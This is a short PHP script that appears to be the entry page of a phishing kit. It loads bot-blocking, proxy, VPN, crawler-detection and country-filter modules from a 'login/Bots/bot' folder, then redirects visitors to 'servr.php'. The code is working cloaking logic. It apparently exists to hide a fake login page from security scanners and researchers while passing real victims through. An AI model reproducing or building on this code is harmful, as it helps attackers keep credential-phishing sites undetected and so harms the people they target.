<?php 

require_once 'login/Bots/bot/blocker.php';
require_once 'login/Bots/bot/proxy.php';
$tanitatikaram = parse_ini_file("login/Bots/bot/config.ini", true);
$setting_vpn = $tanitatikaram['setting_vpn'];
if ($setting_vpn == 'on') {
    require_once 'login/Bots/bot/Virtualprivatenetwork.php';
}
$tanitatikaram = parse_ini_file("login/Bots/bot/config.ini", true);
$setting_crawlerdetect = $tanitatikaram['setting_crawlerdetect'];
if ($setting_crawlerdetect == 'on') {
    require_once 'login/Bots/bot/crawlerdetect.php';
}
require_once 'login/Bots/bot/country.php';
header('Location: servr.php');